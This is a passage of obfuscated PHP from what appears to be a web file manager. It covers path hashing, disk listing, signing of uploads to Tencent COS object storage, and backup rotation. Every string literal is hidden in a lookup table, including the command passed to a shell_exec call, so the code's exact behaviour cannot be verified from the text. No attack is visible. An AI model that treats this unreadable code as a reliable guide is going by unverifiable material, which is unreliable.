$Ñ¬î‡î· = true) { $şû´»„½ =& $_SERVER[¹ş¤¶ĞÖ]; $õÒ­¢–á = is_array($»ÕÛü‰î) ? $»ÕÛü‰î : IO::info($»ÕÛü‰î); $¦®Ù—•Å = _get($õÒ­¢–á, $şû´»„½[1317], $şû´»„½[12]); if (!$¦®Ù—•Å && isset($õÒ­¢–á[$şû´»„½[431]])) { $õÒ­¢–á = IO::info(KodIO::make($õÒ­¢–á[$şû´»„½[431]])); $¦®Ù—•Å = _get($õÒ­¢–á, $şû´»„½[1317], $şû´»„½[12]); } if (!$¦®Ù—•Å && $Ñ¬î‡î·) { $‡…¥ı = KodIO::parse($õÒ­¢–á[$şû´»„½[84]]); if (!$‡…¥ı[$şû´»„½[33]]) { $¦®Ù—•Å = IO::hashSimple($õÒ­¢–á[$şû´»„½[84]]); } } if (!$¦®Ù—•Å) { $¦®Ù—•Å = md5($õÒ­¢–á[$şû´»„½[84]] . $õÒ­¢–á[$şû´»„½[76]] . $õÒ­¢–á[$şû´»„½[85]]); } return $¦®Ù—•Å; } public static function hashPathSafe($¡Õàğ, $ÕÔ²»¿ = true) { $‹„Òƒö =& $_SERVER[¹ş¤¶ĞÖ]; $÷Œµüâò = self::hashPath($¡Õàğ, $ÕÔ²»¿); return md5($÷Œµüâò . $‹„Òƒö[1318] . Model($‹„Òƒö[796])->get($‹„Òƒö[797])); } public static function initSystemPath() { $åÌÌı«› =& $_SERVER[¹ş¤¶ĞÖ]; if (defined($åÌÌı«›[1319])) { return; } define($åÌÌı«›[1319], self::systemPath($åÌÌı«›[1320])); define($åÌÌı«›[1321], self::systemPath($åÌÌı«›[1322])); define($åÌÌı«›[1323], self::systemPath($åÌÌı«›[1324])); define($åÌÌı«›[1325], self::systemPath($åÌÌı«›[1326])); IOHistory::bindEvent(); } public static function systemPath($·££œÚû) { $§ĞÎú„î =& $_SERVER[¹ş¤¶ĞÖ]; $î„èØÚô = $§ĞÎú„î[1327] . ucfirst($·££œÚû); $À™öû = Model($§ĞÎú„î[796])->get($î„èØÚô); if ($À™öû) { return $À™öû; } if ($·££œÚû == $§ĞÎú„î[1320]) { $À™öû = self::make(Model($§ĞÎú„î[851])->systemRootPathAdd($§ĞÎú„î[563])); } else { $À™öû = self::systemPath($§ĞÎú„î[1320]); $¡Óäª©× = self::sourceID($À™öû); $À™öû = self::make(Model($§ĞÎú„î[851])->mkdir($¡Óäª©×, $·££œÚû)); } Model($§ĞÎú„î[796])->set($î„èØÚô, $À™öû); return $À™öû; } public static function systemFolder($Ò¡¤ø¹ˆ) { $Ê§¾¥Š÷ = IO_PATH_SYSTEM_SOURCE . $Ò¡¤ø¹ˆ; $±Åıßâü = Cache::get($Ê§¾¥Š÷); if (!$±Åıßâü) { $åĞåßªí = IO::infoFull($Ê§¾¥Š÷); if (!$åĞåßªí) { $±Åıßâü = IO::mkdir($Ê§¾¥Š÷, REPEAT_SKIP); } else { $±Åıßâü = $åĞåßªí[$_SERVER[¹ş¤¶ĞÖ][84]]; } Cache::set($Ê§¾¥Š÷, $±Åıßâü, 3600 * 10); } return $±Åıßâü; } public static function defaultDriver() { return Model($_SERVER[¹ş¤¶ĞÖ][793])->defaultDriver(); } public static function defaultIO() { $¼µ‚ã³À =& $_SERVER[¹ş¤¶ĞÖ]; $½ë¿«Æ = self::defaultDriver(); return $¼µ‚ã³À[1328] . $½ë¿«Æ[$¼µ‚ã³À[428]] . $¼µ‚ã³À[1316]; } public static function defaultDriverInit() { static $Òñ²½‚ = false; if ($Òñ²½‚) { return $Òñ²½‚; } $Òñ²½‚ = IO::init(self::defaultIO()); return $Òñ²½‚; } public static function fileTypeList() { $ÊÖ‚·½¢ =& $_SERVER[¹ş¤¶ĞÖ]; $ı´€Ü“Ÿ = $GLOBALS[$ÊÖ‚·½¢[6]][$ÊÖ‚·½¢[1329]]; foreach ($ı´€Ü“Ÿ as $·§¬øÅó => $Ğ¼âß±®) { $ÆªÃ¸õ¨ = $ÊÖ‚·½¢[1330] . $·§¬øÅó; $ß†¬Åô = LNG($ÆªÃ¸õ¨); if ($ÆªÃ¸õ¨ != $ß†¬Åô) { $ı´€Ü“Ÿ[$·§¬øÅó][$ÊÖ‚·½¢[32]] = $ß†¬Åô; } } return $ı´€Ü“Ÿ; } public static function diskList($äÄäğ®» = true) { $Œá˜ºõ = $_SERVER[¹ş¤¶ĞÖ][1331]; if ($äÄäğ®») { $éÜç¡›Ë = Cache::get($Œá˜ºõ); if (is_array($éÜç¡›Ë)) { return $éÜç¡›Ë; } } $éÜç¡›Ë = self::diskListGet(); Cache::set($Œá˜ºõ, $éÜç¡›Ë, 60); return $éÜç¡›Ë; } public static function diskListGet() { $¾­øı¬ =& $_SERVER[¹ş¤¶ĞÖ]; $«Å£Ï»© = array(); if ($GLOBALS[$¾­øı¬[6]][$¾­øı¬[1332]] == $¾­øı¬[1333]) { $¿ÙòùçÚ = $¾­øı¬[1334]; for ($ÙÍ–¯»– = 0; $ÙÍ–¯»– < strlen($¿ÙòùçÚ); $ÙÍ–¯»–++) { $É›Î‡îØ = $¿ÙòùçÚ[$ÙÍ–¯»–] . $¾­øı¬[1335]; if (file_exists($É›Î‡îØ)) { $«Å£Ï»©[] = $É›Î‡îØ; } } return $«Å£Ï»©; } if (!function_exists($¾­øı¬[98])) { $«Å£Ï»©[] = $¾­øı¬[861]; return $«Å£Ï»©; } $ŸõÔëğµ = explode($¾­øı¬[231], shell_exec($¾­øı¬[1336])); array_shift($ŸõÔëğµ); array_pop($ŸõÔëğµ); $¢ÕŞÏğ = array($¾­øı¬[1337], $¾­øı¬[1338], $¾­øı¬[1339], $¾­øı¬[1340], $¾­øı¬[1341], $¾­øı¬[1342], $¾­øı¬[1343], $¾­øı¬[1344]); foreach ($ŸõÔëğµ as $ªæ¨Úü£) { $·€ëÕõ¢ = preg_split($¾­øı¬[1345], $ªæ¨Úü£); $É›Î‡îØ = $·€ëÕõ¢[count($·€ëÕõ¢) - 1]; if (!strstr($·€ëÕõ¢[0], $¾­øı¬[1346]) || !$É›Î‡îØ) { continue; } $’Ñ±Ù¤¿ = rtrim($É›Î‡îØ, $¾­øı¬[8]) . $¾­øı¬[8]; if (in_array($’Ñ±Ù¤¿, $¢ÕŞÏğ)) { continue; } $«Å£Ï»©[] = $’Ñ±Ù¤¿; } return $«Å£Ï»©; } public static function isSameDisk($›òèçÉ, $îâúç‚ù) { $Èôù÷èÛ =& $_SERVER[¹ş¤¶ĞÖ]; if ($GLOBALS[$Èôù÷èÛ[6]][$Èôù÷èÛ[1332]] == $Èôù÷èÛ[1333]) { return strtolower(substr($›òèçÉ, 0, 1)) == strtolower(substr($îâúç‚ù, 0, 1)); } $Ğ¼‹ª¤§ = self::diskList(); $ˆÎôæŒõ = !1; $¢ ¯ı”‘ = !1; sort($Ğ¼‹ª¤§); $Ğ¼‹ª¤§ = array_reverse($Ğ¼‹ª¤§); $›òèçÉ = rtrim($›òèçÉ, $Èôù÷èÛ[8]) . $Èôù÷èÛ[8]; $îâúç‚ù = rtrim($îâúç‚ù, $Èôù÷èÛ[8]) . $Èôù÷èÛ[8]; foreach ($Ğ¼‹ª¤§ as $Ø†€Çş) { $¬¦ƒ¡Ê‚ = strlen($Ø†€Çş); if (!$ˆÎôæŒõ && substr($›òèçÉ, 0, $¬¦ƒ¡Ê‚) == $Ø†€Çş) { $ˆÎôæŒõ = $Ø†€Çş; } if (!$¢ ¯ı”‘ && substr($îâúç‚ù, 0, $¬¦ƒ¡Ê‚) == $Ø†€Çş) { $¢ ¯ı”‘ = $Ø†€Çş; } if ($ˆÎôæŒõ && $¢ ¯ı”‘) { break; } } return $ˆÎôæŒõ === $¢ ¯ı”‘; } public static function transferType($™›ØØÁ, $úóÛ¼†) { $è¤Ïµ£¡ =& $_SERVER[¹ş¤¶ĞÖ]; $ŸÚê¹–‚ = self::driverType($™›ØØÁ); $ÊóéÑ… = self::driverType($úóÛ¼†); if ($ŸÚê¹–‚[$è¤Ïµ£¡[33]] == $ÊóéÑ…[$è¤Ïµ£¡[33]] && $ŸÚê¹–‚[$è¤Ïµ£¡[1347]] == $ÊóéÑ…[$è¤Ïµ£¡[1347]]) { return $è¤Ïµ£¡[1348]; } if ($ŸÚê¹–‚[$è¤Ïµ£¡[33]] == $è¤Ïµ£¡[894] && $ÊóéÑ…[$è¤Ïµ£¡[33]] == $è¤Ïµ£¡[106]) { return $è¤Ïµ£¡[1227]; } if ($ŸÚê¹–‚[$è¤Ïµ£¡[33]] == $è¤Ïµ£¡[106] && $ÊóéÑ…[$è¤Ïµ£¡[33]] == $è¤Ïµ£¡[894]) { return $è¤Ïµ£¡[107]; } return $è¤Ïµ£¡[1349]; } public static function driverType($í½ò‰ğ±) { $òæ©¹ïÏ =& $_SERVER[¹ş¤¶ĞÖ]; $«Ïå¶Ø = str_replace($òæ©¹ïÏ[1350], $òæ©¹ïÏ[12], strtolower($í½ò‰ğ±->getType())); if ($«Ïå¶Ø == $òæ©¹ïÏ[783] || $«Ïå¶Ø == $òæ©¹ïÏ[1351] || $«Ïå¶Ø == $òæ©¹ïÏ[1352]) { $í½ò‰ğ± = self::defaultDriverInit(); } else { if ($«Ïå¶Ø == $òæ©¹ïÏ[1237] || $«Ïå¶Ø == $òæ©¹ïÏ[1353]) { $í½ò‰ğ± = IO::init($í½ò‰ğ±->pathParse[$òæ©¹ïÏ[1184]]); } } $Ÿ­Ÿ˜Ğ = $í½ò‰ğ±->path; $«Ïå¶Ø = str_replace($òæ©¹ïÏ[1350], $òæ©¹ïÏ[12], strtolower($í½ò‰ğ±->getType())); if ($«Ïå¶Ø == $òæ©¹ïÏ[106]) { return array($òæ©¹ïÏ[33] => $òæ©¹ïÏ[106], $òæ©¹ïÏ[1347] => $òæ©¹ïÏ[12], $òæ©¹ïÏ[84] => $Ÿ­Ÿ˜Ğ, $òæ©¹ïÏ[95] => $í½ò‰ğ±); } return array($òæ©¹ïÏ[33] => $òæ©¹ïÏ[894], $òæ©¹ïÏ[1347] => $í½ò‰ğ±->pathDriver, $òæ©¹ïÏ[84] => $Ÿ­Ÿ˜Ğ, $òæ©¹ïÏ[95] => $í½ò‰ğ±); } public static function pathDriverType($ƒÓ£ğÁ“) { return $ƒÓ£ğÁ“ ? self::driverType(IO::init($ƒÓ£ğÁ“)) : !1; } public static function pathDriverLocal($½ÛÎáÒŸ) { $Î´ı ½ =& $_SERVER[¹ş¤¶ĞÖ]; $³ø„×òö = $½ÛÎáÒŸ ? self::driverType(IO::init($½ÛÎáÒŸ)) : !1; return $³ø„×òö[$Î´ı ½[33]] == $Î´ı ½[106] ? !0 : !1; } public static function allowCover($ä¬Ü¥Í¹, $ØŒÌËš = true) { $«â“ñú =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($ä¬Ü¥Í¹)) { $ä¬Ü¥Í¹ = IO::info($ä¬Ü¥Í¹); } if (!$ä¬Ü¥Í¹ || $ä¬Ü¥Í¹[$«â“ñú[33]] == $«â“ñú[75] || $ä¬Ü¥Í¹[$«â“ñú[76]] <= 100) { return !1; } if (isset($ä¬Ü¥Í¹[$«â“ñú[1354]]) || !$ä¬Ü¥Í¹[$«â“ñú[84]]) { return !1; } if (isset($ä¬Ü¥Í¹[$«â“ñú[202]]) && !$ä¬Ü¥Í¹[$«â“ñú[202]]) { return $ä¬Ü¥Í¹; } static $ğƒàåÌ = false; if (!$ğƒàåÌ || !$ØŒÌËš) { $À¯ï®Õç = self::driverType(IO::init($ä¬Ü¥Í¹[$«â“ñú[84]])); $¢©±ÆóÏ = $À¯ï®Õç[$«â“ñú[95]]; $ğƒàåÌ = $«â“ñú[1355]; if ($À¯ï®Õç[$«â“ñú[33]] == $«â“ñú[106]) { $ğƒàåÌ = $«â“ñú[1356]; } if ($À¯ï®Õç[$«â“ñú[95]] && is_array($À¯ï®Õç[$«â“ñú[95]]->config)) { $¨ø¹ãß» = $À¯ï®Õç[$«â“ñú[95]]->config; if (isset($¨ø¹ãß»[$«â“ñú[1357]]) && $¨ø¹ãß»[$«â“ñú[1357]]) { $ğƒàåÌ = $«â“ñú[1356]; } } } return $ğƒàåÌ == $«â“ñú[1356] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($²õáÉ–) { parent::__construct($²õáÉ–); $this->signatureVersion($_SERVER[¹ş¤¶ĞÖ][216]); } public function uploadFormData($ê±ÆÏ§°, $¬÷Ê’Ì = 3600) { $Îè¨£Š² =& $_SERVER[¹ş¤¶ĞÖ]; $¯œ¥Ï‹ = $Îè¨£Š²[199]; $‰ƒ³Çûä = $Îè¨£Š²[232]; $üŒİËÚ‘ = $Îè¨£Š²[242]; $¿©ûÑŒ’ = gmdate($Îè¨£Š²[1358], time() + $¬÷Ê’Ì); $¢§ïü¥ = (string) time() . $Îè¨£Š²[71] . (string) (time() + $¬÷Ê’Ì); $ñ™¨ó•ş = array($Îè¨£Š²[243] => $¿©ûÑŒ’, $Îè¨£Š²[246] => array(array($Îè¨£Š²[248] => $¯œ¥Ï‹), array($Îè¨£Š²[247] => $this->bucket), array($Îè¨£Š²[249], $Îè¨£Š²[250], $Îè¨£Š²[12]), array($Îè¨£Š²[253] => $üŒİËÚ‘), array($Îè¨£Š²[1359] => $‰ƒ³Çûä), array($Îè¨£Š²[1360] => $this->accessKey), array($Îè¨£Š²[1361] => $¢§ïü¥))); $ñ™¨ó•ş = json_encode($ñ™¨ó•ş); $İ‰…£¿ = hash_hmac($Îè¨£Š²[232], $¢§ïü¥, $this->secret); $™ÄÆçË± = sha1($ñ™¨ó•ş); $¹ğæ©äğ = hash_hmac($Îè¨£Š²[232], $™ÄÆçË±, $İ‰…£¿); $¨¿ºô“ = array($Îè¨£Š²[248] => $¯œ¥Ï‹, $Îè¨£Š²[253] => $üŒİËÚ‘, $Îè¨£Š²[261] => base64_encode($ñ™¨ó•ş), $Îè¨£Š²[1359] => $‰ƒ³Çûä, $Îè¨£Š²[1360] => $this->accessKey, $Îè¨£Š²[1362] => $¢§ïü¥, $Îè¨£Š²[1363] => $¹ğæ©äğ, $Îè¨£Š²[182] => $this->getHost()); return $¨¿ºô“; } public function fileOutLink($¹êÖÏˆÄ) { $Ì–Ú¹º =& $_SERVER[¹ş¤¶ĞÖ]; if (substr($¹êÖÏˆÄ, 0, 7) == $Ì–Ú¹º[1364]) { $¹êÖÏˆÄ = $Ì–Ú¹º[1365] . substr($¹êÖÏˆÄ, 7); } header($Ì–Ú¹º[161] . $¹êÖÏˆÄ); die; } } goto D–¿õ„£¼; aáÄÓÓ¨ìÜ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ò‡ˆùÊª =& $_SERVER[¹ş¤¶ĞÖ]; $this->isManual(); self::$name = date($ò‡ˆùÊª[774]); if (!($·ÇîŒğ— = Model($ò‡ˆùÊª[775])->lastItem())) { $·ÇîŒğ— = $this->initData(); } else { self::$name = $·ÇîŒğ—[$ò‡ˆùÊª[32]]; if ($·ÇîŒğ—[$ò‡ˆùÊª[776]] == $ò‡ˆùÊª[88]) { self::$name = date($ò‡ˆùÊª[240]); $†°ÂÃ´³ = 0; if (isset($·ÇîŒğ—[$ò‡ˆùÊª[322]][$ò‡ˆùÊª[200]][$ò‡ˆùÊª[497]])) { $†°ÂÃ´³ = (int) $·ÇîŒğ—[$ò‡ˆùÊª[322]][$ò‡ˆùÊª[200]][$ò‡ˆùÊª[497]]; } if (self::$manual == 0 && $·ÇîŒğ—[$ò‡ˆùÊª[32]] == self::$name) { Model($ò‡ˆùÊª[775])->remove($·ÇîŒğ—[$ò‡ˆùÊª[428]]); } $·ÇîŒğ— = $this->initData($†°ÂÃ´³, $·ÇîŒğ—[$ò‡ˆùÊª[777]]); } else { $this->checkStore($·ÇîŒğ—[$ò‡ˆùÊª[777]]); } } self::$option = $·ÇîŒğ—; } private function isManual() { $Ş×Â÷¬á = _get($GLOBALS, $_SERVER[¹ş¤¶ĞÖ][778], 0); $Ş×Â÷¬á = intval($Ş×Â÷¬á); self::$manual = $Ş×Â÷¬á && $Ş×Â÷¬á == 1 ? 1 : 0; } private function initData($ÁĞîÉ¸æ = 0, $¡±¨‘—á = '') { $†›ÚüÏ´ =& $_SERVER[¹ş¤¶ĞÖ]; $‚Ôã¨ = Model($†›ÚüÏ´[775])->config(); if ($¡±¨‘—á && $‚Ôã¨[$†›ÚüÏ´[777]] != $¡±¨‘—á) { $ÁĞîÉ¸æ = 0; } $this->checkStore($‚Ôã¨[$†›ÚüÏ´[777]]); if (self::$manual == 1) { self::$name .= $†›ÚüÏ´[11] . date($†›ÚüÏ´[779]); } $äåóªıŠ = array($†›ÚüÏ´[777] => $‚Ôã¨[$†›ÚüÏ´[777]], $†›ÚüÏ´[32] => self::$name, $†›ÚüÏ´[776] => 0, $†›ÚüÏ´[780] => $‚Ôã¨[$†›ÚüÏ´[780]], $†›ÚüÏ´[781] => self::$manual, $†›ÚüÏ´[322] => array($†›ÚüÏ´[782] => array($†›ÚüÏ´[776] => 0), $†›ÚüÏ´[783] => array($†›ÚüÏ´[776] => 0, $†›ÚüÏ´[784] => 0, $†›ÚüÏ´[785] => 0, $†›ÚüÏ´[33] => $†›ÚüÏ´[12], $†›ÚüÏ´[786] => 0, $†›ÚüÏ´[787] => 0), $†›ÚüÏ´[788] => array($†›ÚüÏ´[776] => 0, $†›ÚüÏ´[784] => 0, $†›ÚüÏ´[785] => 0, $†›ÚüÏ´[786] => 0, $†›ÚüÏ´[787] => 0), $†›ÚüÏ´[200] => array($†›ÚüÏ´[776] => 0, $†›ÚüÏ´[789] => 0, $†›ÚüÏ´[790] => 0, $†›ÚüÏ´[791] => 0, $†›ÚüÏ´[792] => 0, $†›ÚüÏ´[497] => $ÁĞîÉ¸æ, $†›ÚüÏ´[786] => 0, $†›ÚüÏ´[787] => 0)), $†›ÚüÏ´[786] => time(), $†›ÚüÏ´[787] => 0); $¡‘œÄÚø = Model($†›ÚüÏ´[775])->insert($äåóªıŠ); $äåóªıŠ[$†›ÚüÏ´[428]] = $¡‘œÄÚø; return $äåóªıŠ; } private function checkStore($†¦û½‰) { $óîî±›é =& $_SERVER[¹ş¤¶ĞÖ]; $½Şç—ù  = Model($óîî±›é[793])->listData($†¦û½‰); Model($óîî±›é[793])->checkConfig($½Şç—ù ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹ş¤¶ĞÖ][775])->findByName(self::$name); } return self::$option; } public static function set($¾Ï¨•÷) { $·ÃÚğ» =& $_SERVER[¹ş¤¶ĞÖ]; $êëìŒĞ = self::get(); foreach ($¾Ï¨•÷ as $¾“ã±õù => $ÄĞÉ´Ù“) { $Õ·­­¿Ö = explode($·ÃÚğ»[10], $¾“ã±õù); $ê™±ÃúÊ = count($Õ·­­¿Ö); switch ($ê™±ÃúÊ) { case 1: $êëìŒĞ[$Õ·­­¿Ö[0]] = $ÄĞÉ´Ù“; break; case 2: $êëìŒĞ[$Õ·­­¿Ö[0]][$Õ·­­¿Ö[1]] = $ÄĞÉ´Ù“; break; case 3: $êëìŒĞ[$Õ·­­¿Ö[0]][$Õ·­­¿Ö[1]][$Õ·­­¿Ö[2]] = $ÄĞÉ´Ù“; break; } } Model($·ÃÚğ»[775])->update($êëìŒĞ[$·ÃÚğ»[428]], $êëìŒĞ); self::$option = $êëìŒĞ; return self::$option; } public function keep() { $ô¯Ø¡·ì =& $_SERVER[¹ş¤¶ĞÖ]; $Ï„İûòÈ = self::get(); if ($Ï„İûòÈ[$ô¯Ø¡·ì[322]][$ô¯Ø¡·ì[782]][$ô¯Ø¡·ì[776]] == $ô¯Ø¡·ì[88]) { return; } $this->backupKeep($Ï„İûòÈ); self::set(array($ô¯Ø¡·ì[794] => 1)); } private function backupKeep($øúß£›) { $Ïì„ãÛ¹ =& $_SERVER[¹ş¤¶ĞÖ]; if (self::$manual == 1) { return; } $šâÙ²¾ = Model($Ïì„ãÛ¹[775])->listData(); if (empty($šâÙ²¾)) { return; } $ûÉ×ÛÆ = 0; $ĞÏ˜ÊÈ = array(); foreach ($šâÙ²¾ as $÷¸™’áŸ) { if ($ûÉ×ÛÆ >= 7) { break; } $ĞÏ˜ÊÈ[] = $÷¸™’áŸ[$Ïì„ãÛ¹[32]]; $ûÉ×ÛÆ++; } for ($ûÉ×ÛÆ = 0; $ûÉ×ÛÆ < 12; $ûÉ×ÛÆ++) { $ĞÏ˜ÊÈ[] = date($Ïì„ãÛ¹[795], strtotime("\x2d{$ûÉ×ÛÆ}\40\x6d\157\156\x74\x68\163")); } $ĞÏ˜ÊÈ = array_unique($ĞÏ˜ÊÈ); $İë«¾™“ = Model($Ïì„ãÛ¹[796])->get($Ïì„ãÛ¹[797]); foreach ($šâÙ²¾ as $÷¸™’áŸ) { if (isset($÷¸™’áŸ[$Ïì„ãÛ¹[781]]) && $÷¸™’áŸ[$Ïì„ãÛ¹[781]] == $Ïì„ãÛ¹[88]) { continue; } if (!empty($÷¸™’áŸ[$Ïì„ãÛ¹[32]]) && in_array($÷¸™’áŸ[$Ïì„ãÛ¹[32]], $ĞÏ˜ÊÈ)) { continue; } Model($Ïì„ãÛ¹[775])->remove($÷¸™’áŸ[$Ïì„ãÛ¹[428]]); $­ØçÊ³– = $this->backupPath($øúß£›, $İë«¾™“); IO::remove($­ØçÊ³–, !1); } } private function backupPath($ÓËæíÏã, $¯í¢¢§ = false) { $ºïÀŒÊ‚ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¯í¢¢§) { $¯í¢¢§ = Model($ºïÀŒÊ‚[796])->get($ºïÀŒÊ‚[797]); } $Ì÷Àş‚ = $ÓËæíÏã[$ºïÀŒÊ‚[32]]; $¨ğåÈ = substr(md5($ºïÀŒÊ‚[798] . $¯í¢¢§ . $Ì÷Àş‚), 0, 8); return "\x7b\x69\x6f\72{$ÓËæíÏã[$ºïÀŒÊ‚[777]]}\x7d\x2f\x64\141\164\x61\x62\x61\163\145\x2f\142\141\x63\153\x75\160\x2f" . $Ì÷Àş‚ . $ºïÀŒÊ‚[11] . $¨ğåÈ; } public function db() { $¤â‰’Ï =& $_SERVER[¹ş¤¶ĞÖ]; $öòŠ„‘· = self::get(); if ($öòŠ„‘·[$¤â‰’Ï[322]][$¤â‰’Ï[783]][$¤â‰’Ï[776]] == $¤â‰’Ï[88]) { return !0; } $ıõ‡œñõ = new BackupDb(); if (!$ıõ‡œñõ->index()) { return !1; } self::set(array($¤â‰’Ï[799] => 1)); return !0; } public function dbFile() { $äûá =& $_SERVER[¹ş¤¶ĞÖ]; $ÜãÉ©·Ğ = self::get(); if ($ÜãÉ©·Ğ[$äûá[322]][$äûá[788]][$äûá[776]] == $äûá[88]) { return !0; } $¶ø…­“İ = new BackupDbFile(); if (!$¶ø…­“İ->index()) { return !1; } self::set(array($äûá[800] => 1)); return !0; } public function file() { $®†ãé† =& $_SERVER[¹ş¤¶ĞÖ]; $ÇñáıêÖ = self::get(); if ($ÇñáıêÖ[$®†ãé†[322]][$®†ãé†[200]][$®†ãé†[776]] == $®†ãé†[88]) { return !0; } if (!isset($ÇñáıêÖ[$®†ãé†[780]]) || $ÇñáıêÖ[$®†ãé†[780]] == $®†ãé†[198]) { $Ñ®Ëóµ = new BackupFile(); if (!$Ñ®Ëóµ->index()) { return !1; } } self::set(array($®†ãé†[801] => 1, $®†ãé†[776] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $©å¾´ĞÅ =& $_SERVER[¹ş¤¶ĞÖ]; $¾ÄŠó½ = Backup::get(); self::$io = $¾ÄŠó½[$©å¾´ĞÅ[777]]; self::$name = $¾ÄŠó½[$©å¾´ĞÅ[32]]; $ø¾ô”® = new DbManage(); $‰ºª± = $ø¾ô”®->dbType(); $Ü·îµú³ = array($©å¾´ĞÅ[802] => $‰ºª±, $©å¾´ĞÅ[803] => time()); Backup::set($Ü·îµú³); $îöí¬Ùñ = $this->tmpFilesPath() . $©å¾´ĞÅ[804] . self::$name . $©å¾´ĞÅ[8]; del_dir($îöí¬Ùñ); mk_dir($îöí¬Ùñ); $êÈ­åØ = $¦Éö»Úö = 0; $‚ÏÕ’¥´ = new Task($©å¾´ĞÅ[805], $©å¾´ĞÅ[806], 0, LNG($©å¾´ĞÅ[807]) . $©å¾´ĞÅ[808] . LNG($©å¾´ĞÅ[809])); try { $Õ‹§Ç¾ğ = $ø¾ô”®->db()->getTables(); } catch (Exception $Ş’ÎŸ‰Ä) { $‚ÏÕ’¥´->end(); return !1; } $Õ‹§Ç¾ğ = array_diff($Õ‹§Ç¾ğ, array($©å¾´ĞÅ[810], $©å¾´ĞÅ[811])); foreach ($Õ‹§Ç¾ğ as $›”¸áñ) { $êÈ­åØ += $ø¾ô”®->model($›”¸áñ)->count(); } $‚ÏÕ’¥´->task[$©å¾´ĞÅ[812]] = $êÈ­åØ; $GLOBALS[$©å¾´ĞÅ[813]] = self::$name; foreach ($Õ‹§Ç¾ğ as $›”¸áñ) { $Óïë©– = $îöí¬Ùñ . $›”¸áñ . $©å¾´ĞÅ[814]; $Ó¸¤Ú µ = null; if ($›”¸áñ == $©å¾´ĞÅ[815] && (!isset($¾ÄŠó½[$©å¾´ĞÅ[780]]) || $¾ÄŠó½[$©å¾´ĞÅ[780]] == $©å¾´ĞÅ[198])) { $Ó¸¤Ú µ = self::$io; } $¦Éö»Úö += $ø¾ô”®->sqlFromDb($›”¸áñ, $Óïë©–, $‚ÏÕ’¥´, $Ó¸¤Ú µ); } unset($GLOBALS[$©å¾´ĞÅ[813]]); $‚ÏÕ’¥´->end(); if ($¦Éö»Úö > $êÈ­åØ) { $êÈ­åØ = $¦Éö»Úö; } $Ü·îµú³ = array($©å¾´ĞÅ[802] => $‰ºª±, $©å¾´ĞÅ[799] => 1, $©å¾´ĞÅ[816] => $êÈ­åØ, $©å¾´ĞÅ[817] => $¦Éö»Úö, $©å¾´ĞÅ[818] => time()); Backup::set($Ü·îµú³); if ($êÈ­åØ - $¦Éö»Úö > 0) { $À¥¨¼Š¨ = $©å¾´ĞÅ[819]; if (stristr(I18n::getType(), $©å¾´ĞÅ[820])) { $À¥¨¼Š¨ = $©å¾´ĞÅ[821]; } write_log(array($À¥¨¼Š¨, $Ü·îµú³), $©å¾´ĞÅ[806]); return !1; } return !0; } private function tmpFilesPath() { $¤‰ÙÁç› =& $_SERVER[¹ş¤¶ĞÖ]; $ µ•öÀä = TEMP_FILES; if ($GLOBALS[$¤‰ÙÁç›[6]][$¤‰ÙÁç›[89]][$¤‰ÙÁç›[822]]) { $ µ•öÀä = $GLOBALS[$¤‰ÙÁç›[6]][$¤‰ÙÁç›[89]][$¤‰ÙÁç›[822]]; if (!mk_dir($ µ•öÀä) || !is_writable($ µ•öÀä) || !IO::mkfile($ µ•öÀä . $¤‰ÙÁç›[823])) { $ µ•öÀä = TEMP_FILES; } } return $ µ•öÀä; } } class BackupDbFile { public function __construct() { } public function index() { $¢õ™È‘• =& $_SERVER[¹ş¤¶ĞÖ]; $àë…¿°Ğ = Backup::get(); $ƒĞŸí…ó = $àë…¿°Ğ[$¢õ™È‘•[32]]; $ƒıÆöë = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\160\x5f{$ƒĞŸí…ó}\x2f"; $öÌÔïìŠ = $this->backupPath($àë…¿°Ğ); if (!($öÌÔïìŠ = IO::mkdir($öÌÔïìŠ))) { return !1; } $úäÛÛ’­ = IO::listPath($ƒıÆöë); $ÄÍğÜÚ = isset($úäÛÛ’­[$¢õ™È‘•[83]]) ? $úäÛÛ’­[$¢õ™È‘•[83]] : array(); $Óïş›¹± = array_sum(array_column($ÄÍğÜÚ, $¢õ™È‘•[76])); if (!$Óïş›¹±) { return !1; } $Øñ¨ÍÌ = array($¢õ™È‘•[824] => $Óïş›¹±, $¢õ™È‘•[825] => time()); Backup::set($Øñ¨ÍÌ); $Î¤ÄÔúâ = new TaskFileTransfer($¢õ™È‘•[826], $¢õ™È‘•[806], count($ÄÍğÜÚ), LNG($¢õ™È‘•[807]) . $¢õ™È‘•[415] . LNG($¢õ™È‘•[809]) . $¢õ™È‘•[827]); $Î¤ÄÔúâ->task[$¢õ™È‘•[789]] = $Óïş›¹±; foreach ($úäÛÛ’­[$¢õ™È‘•[83]] as $ÏŠüÓ) { $…£Ö®éû = IO::move($ÏŠüÓ[$¢õ™È‘•[84]], $öÌÔïìŠ); if (!$…£Ö®éû) { $Î¤ÄÔúâ->end(); $ÀñÅ¼ = IO::getLastError($¢õ™È‘•[828] . $ÏŠüÓ[$¢õ™È‘•[84]] . $¢õ™È‘•[829] . $öÌÔïìŠ . $¢õ™È‘•[164]); write_log($ÀñÅ¼, $¢õ™È‘•[806]); return !1; } } $÷•·ú¹‰ = new DbManage(); $¬Î§ú’î = $÷•·ú¹‰->getSqlFile(); if (!$¬Î§ú’î[$¢õ™È‘•[830]] || !$¬Î§ú’î[$¢õ™È‘•[13]]) { return !1; } IO::move($¬Î§ú’î[$¢õ™È‘•[830]], $öÌÔïìŠ); IO::move($¬Î§ú’î[$¢õ™È‘•[13]], $öÌÔïìŠ); $Î¤ÄÔúâ->end(); $Øñ¨ÍÌ = array($¢õ™È‘•[831] => $Óïş›¹±, $¢õ™È‘•[832] => time()); Backup::set($Øñ¨ÍÌ); return !0; } private function backupPath($—§Æ’¯ƒ) { $ı–‰ò =& $_SERVER[¹ş¤¶ĞÖ]; $Óø±ÚŸ• = $—§Æ’¯ƒ[$ı–‰ò[32]]; $ôÏÌÃ›ß = Model($ı–‰ò[796])->get($ı–‰ò[797]); $õÍ³ƒà = substr(md5($ı–‰ò[798] . $ôÏÌÃ›ß . $Óø±ÚŸ•), 0, 8); return 